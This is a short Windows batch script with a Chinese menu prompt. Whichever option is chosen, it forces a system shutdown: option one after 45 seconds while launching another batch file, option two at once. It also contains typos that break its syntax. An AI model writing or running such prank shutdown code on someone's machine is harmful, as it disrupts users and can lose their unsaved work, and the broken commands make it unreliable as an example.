:a
echeo 输入1或2
set /p choice=1 ok 2 no

;a_Next
if %choice%==1 goto gg
if %choice%==2 goto hh

:gg
start 1.bat
shutdown /s /t 45
1.txt
exit

:hh
start shutdown /s /t 0
net start netlogon 
exit